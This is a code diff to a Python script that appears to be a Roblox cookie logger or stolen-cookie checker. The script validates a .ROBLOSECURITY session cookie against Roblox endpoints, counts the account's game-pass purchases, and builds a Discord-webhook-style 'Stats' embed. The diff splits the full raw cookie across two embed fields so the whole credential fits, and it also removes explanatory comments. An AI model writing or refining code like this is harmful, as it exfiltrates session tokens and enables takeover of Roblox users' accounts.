@@ -65,7 +65,6 @@ def main():
         auth_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=10)
         print(f"DEBUG: Auth endpoint status code: {auth_res.status_code}", file=sys.stderr)
         
-        # Handle invalid or expired session cookies gracefully (401/403)
         if auth_res.status_code in (401, 403):
             print("Error: Invalid, expired, or unauthorized cookie (401/403).", file=sys.stderr)
 
@@ -172,7 +171,6 @@ def main():
                             return False
 
                 def get_gamepasses_bought():
-                    """Paginate through purchase transactions and count entries where details.type == 'GamePass'."""
                     count = 0
                     cursor = ""
                     while True:
@@ -182,7 +180,7 @@ def main():
                             params["cursor"] = cursor
                         try:
                             res = session.get(url, params=params, timeout=10)
-                            if res.status_code == 429:  # Rate-limited handling
+                            if res.status_code == 429:
                                 time.sleep(5)
                                 continue
                             if res.status_code in (401, 403):
@@ -227,8 +225,10 @@ def main():
 
         avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com/images/icon_certificate.png"
         
-        # Display the cleanly extracted short cookie token
-        cookie_display = f"```text\n{roblosecurity}\n```"
+        # Split cookie securely to avoid Discord's 1024 character field limit
+        mid = len(roblosecurity) // 2
+        cookie_part_1 = f"```text\n{roblosecurity[:mid]}\n```"
+        cookie_part_2 = f"```text\n{roblosecurity[mid:]}\n```"
 
         payload = {
             "username": f"{display_name} | Stats",
@@ -281,8 +281,13 @@ def main():
                             "inline": True
                         },
                         {
-                            "name": "Cookie",
-                            "value": cookie_display,
+                            "name": "Cookie (Part 1)",
+                            "value": cookie_part_1,
+                            "inline": False
+                        },
+                        {
+                            "name": "Cookie (Part 2)",
+                            "value": cookie_part_2,
                             "inline": False
                         }
                     ],
